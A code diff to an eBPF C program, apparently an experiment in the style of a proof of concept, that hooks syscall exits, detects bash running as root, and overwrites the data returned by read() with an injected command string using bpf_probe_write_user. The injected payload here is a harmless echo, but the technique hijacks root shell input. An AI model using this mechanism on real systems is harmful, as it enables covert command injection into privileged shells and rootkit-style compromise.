@@ -19,12 +19,12 @@ char LICENSE[] SEC("license") = "GPL";
 
 
 // The key will be 0, and the value will be the file descriptor
-struct {
-    __uint(type, BPF_MAP_TYPE_ARRAY);
-    __uint(max_entries, 1);
-    __type(key, int);
-    __type(value, int);
-} fd_map SEC(".maps");
+// struct {
+//     __uint(type, BPF_MAP_TYPE_ARRAY);
+//     __uint(max_entries, 1);
+//     __type(key, int);
+//     __type(value, int);
+// } fd_map SEC(".maps");
 
 int is_bash_with_root(struct pt_regs *ctx)
 {
@@ -53,51 +53,70 @@ int is_bash_with_root(struct pt_regs *ctx)
     return 0;
 }
 
-void save_target_bash_fd(long ret_fd) 
-{
-    // Store the file descriptor in the map
-    int key = 0;
-    long ret = bpf_map_update_elem(&fd_map, &key, &ret_fd, BPF_ANY);
+// void save_target_bash_fd(int ret_fd) 
+// {
+//     // Store the file descriptor in the map
+//     int key = 0;
+//     long ret = bpf_map_update_elem(&fd_map, &key, &ret_fd, BPF_ANY);
     
-    if (ret != 0) 
-    {
-        bpf_printk("Failed to update map: %d\n", ret);
-    }
-}
+//     if (ret != 0) 
+//     {
+//         bpf_printk("Failed to update map: %d\n", ret);
+//     }
+// }
 
 
 SEC("raw_tracepoint/sys_exit")
 int tp_exit(struct bpf_raw_tracepoint_args *ctx)
 {
-    // long syscall_nr = ctx->args[1];
-
     struct pt_regs *regs = (struct pt_regs *)ctx->args[0];
-    long ret = (long)ctx->args[1];
 
-    
     // Get the syscall number from the regs struct
     // long syscall_nr = BPF_CORE_READ(regs, orig_rax);
-    unsigned long syscall_nr;
-    bpf_probe_read(&syscall_nr, sizeof(syscall_nr) , &regs->orig_rax);
 
-    // Check for openat and bash with root privileges
-    // if (syscall_nr == __NR_openat && is_bash_with_root(ctx)) {
-
-    if (is_bash_with_root(ctx)) {
-        
-        // long ret_fd = ctx->args[0];
-        int fd = (int)ret;
-
-        bpf_printk("from tp_exit=> Found bash in root, file descriptor=> %lu syscall_nr=> %d\n", ret,syscall_nr);
-
-        // Ensure the file descriptor is valid (>= 0)
-        if (fd >= 0) 
-        {
-
-            save_target_bash_fd(fd);
-        }
-    }
+    // READ SAFELY!!!
+    unsigned long syscall_nr;   // syscall no.
+    bpf_probe_read(&syscall_nr, sizeof(syscall_nr), &regs->orig_rax);
     
+    // If syscall is read and process is bash with root uid
+    if (syscall_nr == __NR_read && is_bash_with_root(ctx)) 
+    {
+        int fd;
+        bpf_probe_read(&fd, sizeof(fd), &regs->rdi);
+
+        bpf_printk("from tp_exit=> Found bash in root with openat, file descriptor=> %d syscall_nr=> %d\n", fd,syscall_nr);
+
+        int read_bytes = 0;
+        bpf_probe_read(&read_bytes, sizeof(read_bytes), &regs->rax);
+
+        // We only proceed if read() actually returned some bytes.
+        if (read_bytes <= 0) {
+            goto exit;
+        }
+
+        char *buffer = NULL;
+        bpf_probe_read(&buffer , sizeof(buffer) , &regs->rsi);
+
+        char newcommand[] = "echo Hello from eBPF!!! Nice to meet you";
+
+        int ret = -999;
+        
+        if(read_bytes > sizeof(newcommand))
+        {
+            ret = bpf_probe_write_user((char *)(buffer), newcommand, sizeof(newcommand));
+        }
+        
+        // Ensure the file descriptor is valid (>= 0)
+        // if (fd >= 0) 
+        // {
+            // bpf_printk("from tp_exit=> Found bash in root with openat, file descriptor=> %d syscall_nr=> %d\n", fd,syscall_nr);
+
+            // save_target_bash_fd(fd);
+        // }
+    }
+
+exit:
+    // bpf_printk("handling exit...");
     return 0;
 }
 
